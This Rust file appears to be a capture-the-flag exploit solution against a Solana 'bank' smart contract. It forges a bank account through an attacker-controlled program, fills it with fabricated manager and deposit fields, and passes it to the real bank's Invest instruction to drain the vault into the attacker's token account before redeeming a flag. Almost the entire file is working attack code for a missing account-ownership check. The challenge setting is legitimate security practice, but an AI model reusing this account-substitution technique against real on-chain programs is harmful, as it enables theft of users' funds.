use bank::{Bank, BankInstruction};

use borsh::BorshSerialize;
use setup::{bank_program, flag_program};
use solana_client::{
    nonce_utils::{get_account, Error},
    rpc_client::RpcClient,
};
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    rent::Rent,
    signature::{keypair_from_seed, read_keypair_file, Keypair},
    signer::Signer,
    system_instruction::create_account,
    transaction::Transaction,
};
use spl_associated_token_account::get_associated_token_address;
use std::{env, path::PathBuf, str::FromStr};

fn main() {
    let args: Vec<String> = env::args().collect();
    let rich_boi = read_keypair_file(PathBuf::from(&args.get(1).expect("rich_boi.jon not on position 1"))).unwrap();
    let bank_initializer = Pubkey::from_str(&args.get(2).expect("No bank_initializer program on position 2")).unwrap();
    let rpc_url = args.get(3).expect("No bank_initializer program on position 3");
    let rpc_client = RpcClient::new(rpc_url.to_owned());

    let (recent_blockhash, _fee_calculator) = rpc_client.get_recent_blockhash().unwrap();
    
    let flag_mint = Pubkey::from_str("F1agMint11111111111111111111111111111111111").unwrap();

    let flag_token_account_of_rich_boi = get_associated_token_address(&rich_boi.pubkey(), &flag_mint);
    
    let new_bank = keypair_from_seed(
        "fake_bank_asdf_asdf_asdf_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
            .as_bytes(),
    )
    .unwrap();

    println!("Rich boi: {}", rich_boi.pubkey());
    println!("Fake Bank Account: {}", new_bank.pubkey());
    println!("Bank Initializer program: {}", bank_initializer);
    println!("Associated token account: {}", flag_token_account_of_rich_boi);
    

    match get_account(&rpc_client, &new_bank.pubkey()) {
        Err(Error::Client(msg)) => {
            if msg.contains("AccountNotFound") {
                //not initialized yet

                //first create a fake bank account

                let create_and_init_bank = create_bank(&rich_boi, &new_bank, &bank_initializer);

                let mut bank_tx = Transaction::new_with_payer(
                    &[
                        create_and_init_bank[0].clone(),
                        create_and_init_bank[1].clone(),
                    ],
                    Some(&rich_boi.pubkey()),
                );

                bank_tx.sign(&[&rich_boi, &new_bank], recent_blockhash);

                let create_and_init_res = rpc_client
                    .send_and_confirm_transaction(&mut bank_tx)
                    .unwrap();

                println!("{:#?}", create_and_init_res);
            } else {
                println!("Unknown Error: {}", msg);
                panic!();
            }
        }
        Err(err) => {
            println!("Unknown Error: {}", err);
        }
        Ok(_) => (),
    }

    let invest_ix = invest_instruction(&rich_boi, &new_bank, &flag_token_account_of_rich_boi);

    let mut invest_tx = Transaction::new_with_payer(&[invest_ix], Some(&rich_boi.pubkey()));

    invest_tx.sign(&[&rich_boi], recent_blockhash);

    let res = rpc_client.send_and_confirm_transaction(&mut invest_tx);
    println!("{:#?}", res);

    //now redeem

    let redeem_ix = get_flag(&flag_token_account_of_rich_boi, &rich_boi);

    let mut redeem_tx = Transaction::new_with_payer(&[redeem_ix], Some(&rich_boi.pubkey()));

    redeem_tx.sign(&[&rich_boi], recent_blockhash);

    let res = rpc_client.simulate_transaction(&redeem_tx);

    println!("{:#?}", res);
}

fn create_bank(rich_boi: &Keypair, new_bank: &Keypair, bank_initializer: &Pubkey) -> Vec<Instruction> {
    let (bank_address, _bank_seed) = Pubkey::find_program_address(&[], &bank_program::id());
    let (vault_key, _vault_seed) =
        Pubkey::find_program_address(&[bank_address.as_ref()], &bank_program::id());
    let (vault_authority, vault_authority_seed) =
        Pubkey::find_program_address(&[vault_key.as_ref()], &bank_program::id());

    let bank_struct = Bank {
        manager_key: rich_boi.pubkey().to_bytes(),
        reserve_rate: 0,
        total_deposit: 10000000,
        vault_authority: vault_authority.to_bytes(),
        vault_authority_seed: vault_authority_seed,
        vault_key: vault_key.to_bytes(),
    };

    let mut bank_serialized = Vec::<u8>::new();

    bank_struct.serialize(&mut bank_serialized).unwrap();



    let create_ix = create_account(
        &rich_boi.pubkey(),
        &new_bank.pubkey(),
        Rent::minimum_balance(&Rent::default(), bank_serialized.len()),
        bank_serialized.len() as u64,
        bank_initializer,
    );

    let write_bank_ix = write_bank(bank_serialized, bank_initializer.clone(), new_bank.pubkey());

    vec![create_ix, write_bank_ix]
}

fn invest_instruction(rich_boi: &Keypair, new_bank: &Keypair, recipient: &Pubkey) -> Instruction {
    let (bank_address, _bank_seed) = Pubkey::find_program_address(&[], &bank_program::id());
    let (vault_key, _vault_seed) =
        Pubkey::find_program_address(&[bank_address.as_ref()], &bank_program::id());
    let (vault_authority, _vault_authority_seed) =
        Pubkey::find_program_address(&[vault_key.as_ref()], &bank_program::id());

    Instruction {
        program_id: bank_program::id(),
        accounts: vec![
            AccountMeta::new(new_bank.pubkey(), false),
            AccountMeta::new(vault_key, false),
            AccountMeta::new(vault_authority, false),
            AccountMeta::new(recipient.clone(), false),
            AccountMeta::new(rich_boi.pubkey(), true),
            AccountMeta::new(spl_token::id(), false),
        ],
        data: BankInstruction::Invest { amount: 1 }.try_to_vec().unwrap(),
    }
}

fn write_bank(bank_data: Vec<u8>, writer_program: Pubkey, bank_account: Pubkey) -> Instruction {
    Instruction {
        program_id: writer_program,
        data: bank_data,
        accounts: vec![AccountMeta::new(bank_account, false)],
    }
}

fn get_flag(recipient: &Pubkey, rich_boi: &Keypair) -> Instruction {
    Instruction {
        program_id: flag_program::id(),
        accounts: vec![
            AccountMeta::new(recipient.clone(), false),
            AccountMeta::new(rich_boi.pubkey(), true),
        ],
        data: Vec::new(),
    }
}
